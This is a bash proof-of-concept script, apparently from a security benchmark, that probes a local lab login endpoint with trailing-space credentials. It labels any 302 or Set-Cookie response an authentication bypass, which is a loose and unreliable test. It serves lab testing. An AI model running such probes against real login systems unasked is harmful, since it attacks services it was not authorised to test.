#!/bin/bash
# POC: Demonstrates authentication bypass by adding trailing whitespace to username and password credentials
# Target: ./repo
# Created: 2025-11-07T17:03:31.397Z
# Session: benchmark-XBEN-063-24-mhp3aptq

# Authentication Bypass - Whitespace in Credentials POC
# Tests whether the login form properly validates and trims whitespace from credentials

TARGET_URL="http://localhost:32768"
LOGIN_ENDPOINT="/login"

echo "=== Authentication Bypass via Whitespace POC ==="
echo "Target: $TARGET_URL$LOGIN_ENDPOINT"
echo ""

# Test 1: Username with trailing space
echo "[TEST 1] Username with trailing space"
echo "Payload: username=test%20&password=test"
RESPONSE1=$(curl -s -i -X POST \
  -d "username=test%20&password=test" \
  "$TARGET_URL$LOGIN_ENDPOINT" 2>&1)

echo "Response Headers:"
echo "$RESPONSE1" | head -n 20
echo ""

# Check for successful authentication (302 redirect or session token)
if echo "$RESPONSE1" | grep -q "302\|Location: /home\|Set-Cookie"; then
  echo "✓ TEST 1 PASSED: Username with trailing space authenticated successfully"
  AUTHENTICATED1=true
else
  echo "✗ TEST 1 FAILED: Authentication rejected"
  AUTHENTICATED1=false
fi

echo ""
echo "---"
echo ""

# Test 2: Password with trailing space
echo "[TEST 2] Password with trailing space"
echo "Payload: username=test&password=test%20"
RESPONSE2=$(curl -s -i -X POST \
  -d "username=test&password=test%20" \
  "$TARGET_URL$LOGIN_ENDPOINT" 2>&1)

echo "Response Headers:"
echo "$RESPONSE2" | head -n 20
echo ""

# Check for successful authentication
if echo "$RESPONSE2" | grep -q "302\|Location: /home\|Set-Cookie"; then
  echo "✓ TEST 2 PASSED: Password with trailing space authenticated successfully"
  AUTHENTICATED2=true
else
  echo "✗ TEST 2 FAILED: Authentication rejected"
  AUTHENTICATED2=false
fi

echo ""
echo "---"
echo ""

# Test 3: Both username and password with trailing spaces
echo "[TEST 3] Both username and password with trailing spaces"
echo "Payload: username=test%20&password=test%20"
RESPONSE3=$(curl -s -i -X POST \
  -d "username=test%20&password=test%20" \
  "$TARGET_URL$LOGIN_ENDPOINT" 2>&1)

echo "Response Headers:"
echo "$RESPONSE3" | head -n 20
echo ""

# Check for successful authentication
if echo "$RESPONSE3" | grep -q "302\|Location: /home\|Set-Cookie"; then
  echo "✓ TEST 3 PASSED: Both credentials with trailing spaces authenticated successfully"
  AUTHENTICATED3=true
else
  echo "✗ TEST 3 FAILED: Authentication rejected"
  AUTHENTICATED3=false
fi

echo ""
echo "---"
echo ""
echo "=== SUMMARY ==="
if [ "$AUTHENTICATED1" = true ] || [ "$AUTHENTICATED2" = true ] || [ "$AUTHENTICATED3" = true ]; then
  echo "✓ VULNERABILITY CONFIRMED: Whitespace in credentials bypasses authentication validation"
  exit 0
else
  echo "✗ VULNERABILITY NOT CONFIRMED: All authentication attempts rejected"
  exit 1
fi